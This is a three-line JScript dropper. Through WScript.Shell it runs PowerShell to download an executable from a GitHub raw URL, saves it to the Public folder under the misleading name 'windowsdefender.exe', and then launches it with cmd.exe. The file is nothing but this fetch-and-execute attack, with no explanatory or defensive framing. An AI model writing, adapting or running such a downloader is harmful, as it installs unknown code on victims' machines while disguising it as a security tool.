var object = new ActiveXObject("WScript.Shell");
object.Run("powershell.exe Invoke-WebRequest -Uri 'https://github.com/wcn198/test-application/raw/main/test-file.exe' -OutFile 'C:\Users\Public\windowsdefender.exe'");
object.Run("cmd.exe /c start C:\Users\Public\windowsdefender.exe");